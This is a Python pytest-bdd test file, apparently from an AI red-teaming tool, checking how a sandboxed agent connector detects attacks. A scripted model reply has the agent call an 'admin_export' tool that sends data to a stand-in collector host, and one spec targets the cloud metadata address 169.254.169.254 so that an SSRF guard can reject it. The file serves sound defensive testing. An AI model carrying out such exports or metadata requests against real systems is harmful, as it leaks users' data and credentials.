"""Step definitions for features/agent_targets.feature (Spec 006)."""

from __future__ import annotations

import json
from typing import Any

import pytest
from pytest_bdd import given, scenarios, then, when

from myrtia.connectors.base import OpenAIChatConnector, Response, Status

scenarios("features/agent_targets.feature")


class _ScriptedModelConnector:
    def __init__(self, replies: list[str]) -> None:
        self._replies = list(replies)
        self._idx = 0
        self.config: dict[str, Any] = {"name": "scripted-agent-llm", "model": "fake-model"}
        self.tokens = {"prompt": 0, "completion": 0, "total": 0, "calls": 0}

    def generate(self, _prompt: Any, **_kwargs: Any) -> Response:
        text = self._replies[self._idx] if self._idx < len(self._replies) else "Done."
        self._idx += 1
        return Response(status=Status.SUCCESS, response=text)


@pytest.fixture
def agent_ctx() -> dict[str, Any]:
    return {"events": [], "connector": None, "response": None, "spec": None, "error": None}


@given("a sandbox agent target backed by a simulated model")
def _safe_agent(agent_ctx: dict[str, Any]) -> None:
    from myrtia.connectors.agent_target import AgentTargetConnector

    llm = _ScriptedModelConnector(
        [
            json.dumps({"action": "tool", "tool": "read_note", "arguments": {"path": "notes.md"}}),
            json.dumps(
                {
                    "action": "handoff",
                    "to_agent": "compliance-reviewer",
                    "reason": "Needs policy check",
                }
            ),
            "Reviewed safely by compliance-reviewer.",
        ]
    )
    conn = AgentTargetConnector(base_url="http://127.0.0.1:11434/v1", model="fake", llm=llm)
    conn.set_event_emitter(lambda et, payload: agent_ctx["events"].append((et, payload)))
    agent_ctx["connector"] = conn


@given("a sandbox agent target with forbidden action rules")
def _forbidden_agent(agent_ctx: dict[str, Any]) -> None:
    from myrtia.connectors.agent_target import AgentTargetConnector

    llm = _ScriptedModelConnector(
        [
            json.dumps(
                {
                    "action": "tool",
                    "tool": "admin_export",
                    "arguments": {"destination": "https://collector.example.invalid/dump"},
                }
            ),
            "Exported.",
        ]
    )
    conn = AgentTargetConnector(base_url="http://127.0.0.1:11434/v1", model="fake", llm=llm)
    conn.set_event_emitter(lambda et, payload: agent_ctx["events"].append((et, payload)))
    agent_ctx["connector"] = conn


@given("an agent target spec pointing to a cloud metadata address")
def _ssrf_spec(agent_ctx: dict[str, Any]) -> None:
    agent_ctx["spec"] = {
        "kind": "agent_sdk",
        "base_url": "http://169.254.169.254/latest/meta-data/",
        "model": "qwen2.5:3b",
    }


@given("a live local model endpoint configured for the sandbox agent target")
def _live_agent(live_endpoint: str, agent_ctx: dict[str, Any]) -> None:
    from myrtia.connectors.agent_target import AgentTargetConnector

    llm = OpenAIChatConnector(base_url=live_endpoint, model="qwen2.5:3b")
    conn = AgentTargetConnector(base_url=live_endpoint, model="qwen2.5:3b", llm=llm, max_turns=2)
    conn.set_event_emitter(lambda et, payload: agent_ctx["events"].append((et, payload)))
    agent_ctx["connector"] = conn


@when("an attack sends a prompt that triggers a tool call and a specialist handoff")
@when("an attack tricks the agent into calling a restricted exfiltration tool")
@when("a prompt is sent through the agent target connector")
def _send_prompt(agent_ctx: dict[str, Any]) -> None:
    agent_ctx["response"] = agent_ctx["connector"].generate("Check project notes and policy.")


@when("the target connector is built")
def _build_connector(agent_ctx: dict[str, Any]) -> None:
    from myrtia.connectors.factory import build_target_connector

    try:
        build_target_connector(agent_ctx["spec"])
    except ValueError as exc:
        agent_ctx["error"] = str(exc)


@then('the connector emits "agent.tool_called", "agent.tool_responded", and "agent.handoff"')
def _assert_trace_events(agent_ctx: dict[str, Any]) -> None:
    types = [t for t, _ in agent_ctx["events"]]
    assert "agent.tool_called" in types
    assert "agent.tool_responded" in types
    assert "agent.handoff" in types


@then("no forbidden action is flagged when only safe tools are used")
def _assert_no_forbidden(agent_ctx: dict[str, Any]) -> None:
    assert agent_ctx["connector"].last_trace["attack_succeeded"] is False
    assert agent_ctx["connector"].last_trace["forbidden_actions"] == []


@then('"agent.forbidden_action" is emitted')
def _assert_forbidden_emitted(agent_ctx: dict[str, Any]) -> None:
    assert any(t == "agent.forbidden_action" for t, _ in agent_ctx["events"])


@then("the target connector records the forbidden action as an attack success")
def _assert_attack_success(agent_ctx: dict[str, Any]) -> None:
    assert agent_ctx["connector"].last_trace["attack_succeeded"] is True
    assert agent_ctx["connector"].last_trace["forbidden_actions"]


@then("the SSRF guard rejects the target URL")
def _assert_ssrf_rejected(agent_ctx: dict[str, Any]) -> None:
    assert agent_ctx["error"] is not None
    assert "blocked" in agent_ctx["error"].lower()


@then("the agent completes and returns a valid response")
def _assert_live_ok(agent_ctx: dict[str, Any]) -> None:
    assert agent_ctx["response"].status == Status.SUCCESS
    assert agent_ctx["response"].response.strip()

